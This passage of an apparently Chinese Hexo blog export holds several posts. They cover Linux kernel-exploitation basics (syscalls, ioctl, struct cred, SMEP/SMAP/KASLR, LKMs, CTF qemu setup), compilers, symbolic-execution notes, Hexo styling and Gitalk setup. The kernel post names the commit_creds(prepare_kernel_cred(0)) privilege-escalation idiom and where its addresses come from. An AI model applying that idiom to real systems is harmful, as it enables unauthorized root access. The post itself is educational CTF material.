*/</span><br><span class="line">pushq  %r8                       /* pt_regs-&gt;r8 */</span><br><span class="line">pushq  %r9                       /* pt_regs-&gt;r9 */</span><br><span class="line">pushq  %r10                      /* pt_regs-&gt;r10 */</span><br><span class="line">pushq  %r11                      /* pt_regs-&gt;r11 */</span><br><span class="line">sub $(6*8), %rsp                 /* pt_regs-&gt;bp, bx, r12-15 not saved */</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过汇编指令判断是否为x32_abi（x32架构的程序）</p>
</li>
<li><p>通过系统调用号，跳到全局变量sys_call_table相应位置继续执行系统调用。</p>
</li>
</ol>
<h4 id="kernel-space-to-user-space"><a href="#kernel-space-to-user-space" class="headerlink" title="kernel space to user space"></a>kernel space to user space</h4><p>退出时，流程如下：</p>
<ol>
<li>通过swapgs恢复GS值</li>
<li>通过sysretq或者iretq恢复到用户空间继续执行。如果iretq还需要给出用户空间的一些信息（CS，eflags&#x2F;rflags，esp&#x2F;rsp等）</li>
</ol>
<h3 id="2-4-Syscall系统调用"><a href="#2-4-Syscall系统调用" class="headerlink" title="2.4 Syscall系统调用"></a>2.4 Syscall系统调用</h3><p><strong>系统调用：</strong>指的是用户空间的程序向操作系统内核请求更高权限的服务，比如I&#x2F;O操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如scanf，puts等I&#x2F;O相关函数实际上是对系统调用（eg: read, write）的封装）</p>
<p>系统调用号可以在<code>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</code>和<code>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</code>查看。</p>
<p>系统调用号查询：<code>Linux Syscall Reference</code>和<code>Linux Syscall64 Reference</code></p>
<h3 id="2-5-ioctl设备通信"><a href="#2-5-ioctl设备通信" class="headerlink" title="2.5 ioctl设备通信"></a>2.5 ioctl设备通信</h3><p>ioctl官方手册(<code>shell: man 2 ioctl</code>)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">NAME</span><br><span class="line">       ioctl - control device</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       #include &lt;sys/ioctl.h&gt;</span><br><span class="line"></span><br><span class="line">       int ioctl(int fd, unsigned long request, ...);</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       The ioctl() system call manipulates the underlying device parameters of</span><br><span class="line">       special files.  In particular, many operating characteristics of  char‐</span><br><span class="line">       acter  special  files  (e.g., terminals) may be controlled with ioctl()</span><br><span class="line">       requests.  The argument fd must be an open file descriptor.</span><br><span class="line"></span><br><span class="line">       The second argument is a device-dependent request code.  The third  ar‐</span><br><span class="line">       gument  is an untyped pointer to memory.  It&#x27;s traditionally char *argp</span><br><span class="line">       (from the days before void * was valid C), and will  be  so  named  for</span><br><span class="line">       this discussion.</span><br><span class="line"></span><br><span class="line">       An  ioctl() request has encoded in it whether the argument is an in pa‐</span><br><span class="line">       rameter or out parameter, and the size of the argument argp  in  bytes.</span><br><span class="line">       Macros and defines used in specifying an ioctl() request are located in</span><br><span class="line">       the file &lt;sys/ioctl.h&gt;.  See NOTES.</span><br><span class="line"></span><br><span class="line">RETURN VALUE</span><br><span class="line">       Usually, on success zero is returned.  A few ioctl() requests  use  the</span><br><span class="line">       return  value  as an output parameter and return a nonnegative value on</span><br><span class="line">       success.  On error, -1 is returned, and errno is set appropriately.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看出ioctl也是一个系统调用，用于与设备通信。</p>
<p>int ioctl(int fd, unsigned long request, …) 的第一个参数为打开设备 (open) 返回的 文件描述符，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。<br><strong>使用 ioctl 进行通信的原因：</strong></p>
<ul>
<li>操作系统提供了内核访问标准外部设备的系统调用，因为大多数硬件设备只能够在内核空间内直接寻址, 但是当访问非标准硬件设备这些系统调用显得不合适, 有时候用户模式可能需要直接访问设备。</li>
<li>比如，一个系统管理员可能要修改网卡的配置。现代操作系统提供了各种各样设备的支持，有一些设备可能没有被内核设计者考虑到，如此一来提供一个这样的系统调用来使用设备就变得不可能了。</li>
<li>为了解决这个问题，内核被设计成可扩展的，可以加入一个称为设备驱动的模块，驱动的代码允许在内核空间运行而且可以对设备直接寻址。一个 Ioctl 接口是一个独立的系统调用，通过它用户空间可以跟设备驱动沟通。对设备驱动的请求是一个以设备和请求号码为参数的 Ioctl 调用，如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用。</li>
</ul>
<h3 id="2-6-内核态函数调用"><a href="#2-6-内核态函数调用" class="headerlink" title="2.6 内核态函数调用"></a>2.6 内核态函数调用</h3><p>相比用户态库函数调用，内核态的函数有了一些变化：</p>
<ol>
<li>printf()变更为**printk()**，但需要注意的是printk()<strong>不一定会把内容显示到终端上，但一定在内核缓冲区里</strong>，可以通过 dmesg 查看效果。</li>
<li>memcpy() 变更为**copy_from_user()&#x2F;copy_to_user()**：copy_from_user() 实现了将用户空间的数据传送到内核空间；copy_to_user() 实现了将内核空间的数据传送到用户空间</li>
<li>malloc()变更为**kmalloc()**，内核态的内存分配函数，和malloc()相似，但使用的是 slab&#x2F;slub 分配器</li>
<li>free()变更为**kfree()**，同 kmalloc()</li>
</ol>
<h3 id="2-7-内核权限管理"><a href="#2-7-内核权限管理" class="headerlink" title="2.7 内核权限管理"></a>2.7 内核权限管理</h3><p>kernel负责管理进程，因此kernel也记录了进程的权限。kernel中有两个可以方便的改变权限的函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">commit_creds</span><span class="params">(<span class="keyword">struct</span> cred *new)</span></span><br><span class="line"><span class="keyword">struct</span> cred* <span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct* daemon)</span></span><br></pre></td></tr></table></figure>

<p><strong>从函数名也可以看出，执行 commit_creds(prepare_kernel_cred(0)) 即可获得 root 权限，0 表示 以 0 号进程作为参考准备新的 credentials。</strong></p>
<p>更多关于 prepare_kernel_cred 的信息可以参考源码<br>执行 commit_creds(prepare_kernel_cred(0)) 也是最常用的提权手段，两个函数的地址都可以在 &#x2F;proc&#x2F;kallsyms 中查看（较老的内核版本中是 &#x2F;proc&#x2F;ksyms）。</p>


<p>注：一般情况下，&#x2F;proc&#x2F;kallsyms 的内容需要 root 权限才能查看，若以非root权限查看将显示为0地址。</p>
<h4 id="struct-cred-–-进程权限结构体"><a href="#struct-cred-–-进程权限结构体" class="headerlink" title="struct cred – 进程权限结构体"></a>struct cred – 进程权限结构体</h4><p>内核使用cred结构体记录进程的权限，每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息(uid，gid等），如果能修改某个进程的cred，那么也就修改了这个进程的权限。结构体源码如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;           <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;                   <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      gid;                   <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      suid;                  <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      sgid;                  <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      euid;                  <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      egid;                  <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;                 <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;                 <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="type">unsigned</span>    securebits;            <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_inheritable;   <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_permitted;     <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_effective;     <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_bset;          <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_ambient;       <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   jit_keyring;       <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">    /* keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span>      <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span>       <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span>     <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="type">void</span>        *security;             <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>          <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span>    <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>     <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>               <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<h3 id="2-8-内核保护机制"><a href="#2-8-内核保护机制" class="headerlink" title="2.8 内核保护机制"></a>2.8 内核保护机制</h3><ol>
<li><strong>smep</strong>: Supervisor Mode Execution Protection，当处理器处于 ring 0 模式，执行<strong>用户空间</strong>的代码会触发页错误。（在 arm 中该保护称为 PXN)</li>
<li><strong>smap</strong>: Superivisor Mode Access Protection，类似于 smep，当处理器处于 ring 0 模式，访问<strong>用户空间</strong>的数据会触发页错误。</li>
<li><strong>MMAP_MIN_ADDR</strong>：控制着mmap能够映射的最低内存地址，防止用户非法分配并访问低地址数据。</li>
<li><strong>KASLR</strong>：Kernel Address Space Layout Randomization(内核地址空间布局随机化)，开启后，允许kernel image加载到VMALLOC区域的任何位置。</li>
</ol>
<p>注：Canary, DEP, PIE, RELRO 等保护与用户态原理和作用相同。</p>
<h2 id="3-LKM介绍"><a href="#3-LKM介绍" class="headerlink" title="3. LKM介绍"></a>3. LKM介绍</h2><h4 id="3-1-LKM"><a href="#3-1-LKM" class="headerlink" title="3.1 LKM"></a>3.1 LKM</h4><p>LKM（Loadable Kernel Modules）称为可加载核心模块（内核模块），其可以看作是运行在内和空间的可执行程序，包括：</p>
<ul>
<li>驱动程序（Device drivers）设备驱动文件系统驱动…</li>
<li>内核扩展模块（Modules）</li>
</ul>
<p>LKMs的文件格式和用户态的可执行程序相同，Linux下位ELF，可以使用IDA工具来分析。</p>
<p>模块记忆单独编译，但不能单独运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户空间的进程不同。</p>
<p>模块通常用来实现一种文件系统，一个驱动程序或者其他内核上层的功能。</p>
<p>Linux内核之所以提供模块机制，是因为它本身是一个宏内核（monolithic kernel）。优 点是效率高，都在内核空间运行，缺点时可扩展性和可维护性相对较差，模块机制0     就是为了弥补这一缺陷。</p>
<p><strong>通常情况下，Kernel漏洞的发生也常见于加载的LKMs出现问题。</strong></p>
<p>内核模块的相关指令：<code>insmod</code>, <code>rmmod</code>, <code>lsmod</code>, <code>modprobe</code></p>
<h4 id="3-2-file-operations-结构体"><a href="#3-2-file-operations-结构体" class="headerlink" title="3.2 file_operations 结构体"></a>3.2 file_operations 结构体</h4><p>用户进程在对设备文件进行诸如read&#x2F;write操作时，<strong>系统调用通过设备文件的主设备号找到设备驱动程序，然后读取这个数据结构相应的函数指针，接着把控制权交给该函数，这是Linux的设备驱动程序工作的基本原理</strong>。</p>
<p>内核模块程序的结构中包括一些<a href="https://zhuanlan.zhihu.com/p/627181746">callback回调表</a>，对应的函数存储在一个file_operation(fop)结构体中，这也是相当重要的结构体，结构体中实现了的回调函数就会静态初始化函数地址，而未实现的函数，值为NULL。</p>
<p>例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Events	User 	functions			Kernel functions</span></span><br><span class="line"><span class="comment">Load	insmod	module_init()</span></span><br><span class="line"><span class="comment">Open	fopen	file_operations: 	open</span></span><br><span class="line"><span class="comment">Read	fread	file_operations: 	read</span></span><br><span class="line"><span class="comment">Write	fwrite	file_operations: 	write</span></span><br><span class="line"><span class="comment">Close	fclose	file_operations: 	release</span></span><br><span class="line"><span class="comment">Remove	rmmod	module_exit()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">hello_init</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;&lt;1&gt; Hello world!n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">hello_exit</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;&lt;1&gt; Bye, cruel worldn&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">module_fops</span> =</span> </span><br><span class="line">&#123;</span><br><span class="line">    read: module_read,</span><br><span class="line">    write: module_write,</span><br><span class="line">    open: module_open,</span><br><span class="line">    release: module_release</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中，module_init&#x2F;module_exit是在载入&#x2F;卸载这个驱动时自动运行；而fop结构体实现了如上四个callback，冒号右侧的函数名是由开发者自己起的，在驱动程序载入内核后，其他用户程序程序就可以借助<strong>文件方式</strong>像进行系统调用一样调用这些函数实现所需功能。</p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>不同于用户态的pwn，Kernel-Pwn不再是用python远程链接打payload拿shell，而是给你一个环境包，下载后qemu本地起系统。对于一个Kernel-Pwn来说，题目通常会给定以下文件：<br><strong>boot.sh:</strong> 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 启动参数有关；<strong>bzImage</strong>: kernel binary；<strong>rootfs.cpio</strong>: 文件系统映像<br><strong>qemu 启动的参数：</strong></p>
<ul>
<li>-initrd rootfs.cpio，使用 rootfs.cpio 作为内核启动的文件系统</li>
<li>-kernel bzImage，使用 bzImage 作为 kernel 映像</li>
<li>-cpu kvm64,+smep，设置 CPU 的安全选项，这里开启了 smep</li>
<li>-m 64M，设置虚拟 RAM 为 64M，默认为 128M 其他的选项可以通过 —help 查看。</li>
</ul>
<p>本地写好 exploit 后，可以通过 base64 编码等方式把编译好的二进制文件保存到远程目录下，进而拿到 flag。同时可以使用 musl, uclibc 等方法减小 exploit 的体积方便传输。<br>但是为了我们调试Demo方便，我们最好在本地也编译一个bzImage。</p>
<p>注：部分Kernel漏洞只影响低版本，高版本的Kernel已对脆弱的机制进行了一定程度的遏制乃至进行了消除，但是和Glibc相同，部分中低版本的内核仍有很高的用户量，因此我们对于低版本Kernel的漏洞研究并非是没有意义的，同时，在实际调试Demo时，请特别注意Demo漏洞影响的Kernel版本。</p>
]]></content>
      <tags>
        <tag>Kernel Pwn</tag>
        <tag>LKM</tag>
        <tag>内核模块</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核模块-交叉编译器</title>
    <url>/posts/b78b50e.html</url>
    <content><![CDATA[<h2 id="GCC"><a href="#GCC" class="headerlink" title="GCC"></a>GCC</h2><p>GNC C Compiler —&gt; GNU Compiler Collection</p>
<ul>
<li>包括编译器、链接器、binutils、glibc、头文件</li>
<li>支持多种语言（C、C++、Java、Go）和多种硬件平台（X86、ARM、MIPS、RISC-V）</li>
</ul>
<h2 id="Clang"><a href="#Clang" class="headerlink" title="Clang"></a>Clang</h2><p>编译器的构成</p>
<ul>
<li>Frontend：源码分析、语法检查，输出中间代码</li>
<li>Optimizer：对中间代码进行优化、使其运行更高效</li>
<li>Backend：将中间代码转换为某一个平台的机器代码</li>
</ul>
<p>编译器的实现</p>
<ul>
<li>GCC：前端和后端分离，支持多种语言、多个平台。但缺点：前后端耦合高，代码可重用性低。</li>
<li>LLVM（Low Level Virtual Machine）框架：<strong>模块化设计</strong>，代码可重用性高；中间语言LLVM IR，<strong>类C表达</strong>，<strong>可扩展</strong>各种前端、后端；支持C&#x2F;C++&#x2F;Java等语言</li>
<li>使用LLVM框架的编译器：<ul>
<li>LLVM GCC：前端使用GCC（Apple）</li>
<li>Clang：LLVM+Clang前端（使用C&#x2F;C++）（Apple，Android）</li>
<li>方舟编译器：编译优化（Java虚拟机，效率提高），鸿蒙系统</li>
</ul>
</li>
</ul>
]]></content>
      <tags>
        <tag>内核模块</tag>
        <tag>交叉编译</tag>
        <tag>gcc</tag>
        <tag>clang</tag>
      </tags>
  </entry>
  <entry>
    <title>DSE论文笔记</title>
    <url>/posts/25083369.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>通过建立一个比较简单的语法简单中间语言（A simple intermediate language，SIMPIL）。对Dynamic taint analysis和forward symbolic execution进行了讲解。</p>
<h3 id="SIMPIL"><a href="#SIMPIL" class="headerlink" title="SIMPIL"></a>SIMPIL</h3><img src="/posts/25083369/image-20240105122737426.png" class="" title="image-20240105122737426">

<img src="/posts/25083369/image-20240105122751384.png" class="" title="image-20240105122751384">

<h2 id="动态污点分析"><a href="#动态污点分析" class="headerlink" title="动态污点分析"></a>动态污点分析</h2><p><strong>动态污点分析</strong>：跟踪源头与sink点的信息流。任何由污染源推导的值都是污点（T），其他值看作未污染。</p>
<p><strong>两种错误：</strong></p>
<ul>
<li>overtainted：假阳性</li>
<li>undertainting：假阴性</li>
</ul>
<h3 id="动态污点分析策略"><a href="#动态污点分析策略" class="headerlink" title="动态污点分析策略"></a>动态污点分析策略</h3><h4 id="Taint-Introduction"><a href="#Taint-Introduction" class="headerlink" title="Taint Introduction"></a>Taint Introduction</h4><p>将用户输入作为污染源</p>
<h4 id="Taint-Propagation"><a href="#Taint-Propagation" class="headerlink" title="Taint Propagation"></a>Taint Propagation</h4><h4 id="Taint-Checking"><a href="#Taint-Checking" class="headerlink" title="Taint Checking"></a>Taint Checking</h4><p>查看是否污染</p>
<h2 id="前向符号执行"><a href="#前向符号执行" class="headerlink" title="前向符号执行"></a>前向符号执行</h2><p>前向符号性可以通过建立逻辑表达式分析程序在不同输入下的行为。属于静态分析。</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>DSE</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo博客导航栏美化</title>
    <url>/posts/a5aaf96c.html</url>
    <content><![CDATA[<p>目前网站还是有一些问题，例如导航栏图标不全，还有样式比较丑…</p>
<h2 id="初始效果"><a href="#初始效果" class="headerlink" title="初始效果"></a>初始效果</h2><img src="/posts/a5aaf96c/image-20241027222855421.png" class="" title="image-20241027222855421">

<h2 id="改进方法"><a href="#改进方法" class="headerlink" title="改进方法"></a>改进方法</h2><h3 id="添加导航栏图标"><a href="#添加导航栏图标" class="headerlink" title="添加导航栏图标"></a>添加导航栏图标</h3><p>查找<a href="https://fontawesome.com.cn/"><code>fontawesome</code></a>图标库</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">nav:</span></span><br><span class="line">  <span class="comment"># Navigation bar logo image</span></span><br><span class="line">  <span class="attr">logo:</span></span><br><span class="line">  <span class="attr">display_title:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Whether to fix navigation bar</span></span><br><span class="line">  <span class="attr">fixed:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="string">首页:</span>   <span class="string">/</span>           <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="string">文章||far</span> <span class="attr">fa-folder-open:</span></span><br><span class="line">    <span class="string">归档:</span>   <span class="string">/archives/</span>  <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-archive</span></span><br><span class="line">    <span class="string">标签:</span>   <span class="string">/tags/</span>      <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-tags</span></span><br><span class="line">    <span class="string">分类:</span>   <span class="string">/categories/</span>  <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-folder-open</span></span><br><span class="line">  </span><br><span class="line">  <span class="string">时间轴:</span> <span class="string">/sitetime</span>   <span class="string">||</span>  <span class="string">fad</span> <span class="string">fa-hourglass-end</span></span><br><span class="line">  <span class="string">清单||fas</span> <span class="attr">fa-heartbeat:</span></span><br><span class="line">    <span class="string">音乐:</span> <span class="string">/music/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-music</span></span><br><span class="line">    <span class="string">照片:</span> <span class="string">/Gallery/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-images</span></span><br><span class="line">    <span class="string">电影:</span> <span class="string">/movies/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-video</span></span><br><span class="line">    <span class="string">关于:</span> <span class="string">/about/</span> <span class="string">||</span>  <span class="string">far</span> <span class="string">fa-paper-plane</span></span><br></pre></td></tr></table></figure>



<h3 id="鼠标移入菜单效果"><a href="#鼠标移入菜单效果" class="headerlink" title="鼠标移入菜单效果"></a>鼠标移入菜单效果</h3><p>原本是鼠标悬浮后标签下出现蓝条，现在改为放大效果，通过添加自定义CSS实现</p>
<ol>
<li><p>在博客根目录source目录下创建好css、js、img文件夹，用来存放自定义的文件，这里我将这些文件夹统一放在&#x2F;source&#x2F;config目录下：</p>
<img src="/posts/a5aaf96c/image-20241027223321828.png" class="" title="image-20241027223321828">
</li>
<li><p>引入自定义的js、css文件<br>直接在主题配置文件中配置即可，这里我的配置文件为_config.butterfly.yml，在文件中找到inject</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Inject</span></span><br><span class="line"><span class="comment"># ps：引入自定义css、js</span></span><br><span class="line"><span class="comment">#     css文件在head引入，js文件在bottom里引入，有的js要求在head引入，不然无法生效</span></span><br><span class="line"><span class="comment"># Insert the code to head (before &#x27;&lt;/head&gt;&#x27; tag) and the bottom (before &#x27;&lt;/body&gt;&#x27; tag)</span></span><br><span class="line"><span class="comment"># ps: 插入代码到头部 &lt;/head&gt; 之前 和 底部 &lt;/body&gt; 之前</span></span><br><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span> <span class="comment">#注入自定义css</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/config/css/style.css&quot;&gt;</span></span><br><span class="line">    <span class="comment"># - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span> <span class="comment">#注入自定义js</span></span><br><span class="line">    <span class="comment">#  - &lt;script src=&quot;/config/js/script.js?v1&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">    <span class="comment"># - &lt;script src=&quot;/xxxx&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>添加自定义css文件</p>
<p>在&#x2F;source&#x2F;config&#x2F;css中新建style.css文件，添加如下内容：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 去除导航栏选项中底下的蓝条 */</span></span><br><span class="line"><span class="selector-id">#nav</span> *<span class="selector-pseudo">::after</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: transparent<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 导航栏菜单鼠标移入字体放大 */</span></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-id">#site-name</span><span class="selector-pseudo">:hover</span>, </span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-class">.menus_item</span><span class="selector-pseudo">:hover</span>, </span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-id">#search-button</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">28px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>可以成功实现效果，不过有点不协调，如果导航栏居中的话可以使用这一效果（类似于mac的dork效果）。</p>
<h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><img src="/posts/a5aaf96c/image-20241027225811317.png" class="" title="image-20241027225811317">
]]></content>
      <tags>
        <tag>教程</tag>
        <tag>Hexo</tag>
        <tag>美化</tag>
        <tag>建站</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo添加gittalk评论功能</title>
    <url>/posts/f4a569f8.html</url>
    <content><![CDATA[<p>Hexo博客评论区功能搭建过程记录</p>
<p>尝试使用Gittalk来实现评论区功能，twikoo搭建过程中netlify账户验证不成功，还需要上传个人证件，比较抽象，因此还是采用gittalk的方式来构建评论区。</p>
<h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><img src="/posts/f4a569f8/image-20241028103236803.png" class="" title="image-20241028103236803">

<h2 id="配置过程"><a href="#配置过程" class="headerlink" title="配置过程"></a>配置过程</h2><ol>
<li><p><strong>在github中设置oauth application功能</strong>：打开github个人settings界面</p>
<img src="/posts/f4a569f8/image-20241028103444380.png" class="" title="image-20241028103444380">

<p>然后选择Developer settings，点击OAuth Apps，再选择新建New OAuth App：</p>
<img src="/posts/f4a569f8/image-20241028103534417.png" class="" title="image-20241028103534417">

<p>填写好名称，以及个人Hexo博客的地址即可获取到Client ID和ClientSecret，这两个需要在Hexo中进行配置。</p>
<img src="/posts/f4a569f8/image-20241028103619287.png" class="" title="image-20241028103619287">
</li>
<li><p><strong>在Hexo Butterfly主题配置Gittalk：</strong></p>
<p>参考<a href="https://butterfly.js.org/posts/4aa8abbe/?highlight=git#%E8%A9%95%E8%AB%96">官方文档</a>，在配置文件yml里填写好刚刚申请到的Client ID和ClientSecret就可以了。</p>
</li>
</ol>
<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><ol>
<li><p><strong>配置好后发现评论区没有初始化成功：</strong><img src="/posts/f4a569f8/image-20241028104105092.png" class="" title="image-20241028104105092"></p>
<p>原因是Gittalk需要管理员用户访问该页面才可以完成初始化，因此只需要点击登入完成认证即可。之后只需要访问一次其他文章界面就可以完成初始化。</p>
</li>
<li><p><strong>登入时报错Invalid Redirect URI</strong>：</p>
<img src="/posts/f4a569f8/image-20241028104306608.png" class="" title="image-20241028104306608">

<p>读报警信息可以知道，登入时所在url与配置github oauth app时配置的url不同，检查一下配置是否有问题即可。</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>教程</tag>
        <tag>Hexo</tag>
        <tag>建站</tag>
      </tags>
  </entry>
  <entry>
    <title>2024 ZJUCTF WriteUp</title>
    <url>/posts/dc126860.html</url>
    <content><![CDATA[<p>本次校赛题目质量不错，难度设置比较合适，属于是看到感觉可以试一试的程度。其中*A口算很有趣！强烈推荐！！！</p>
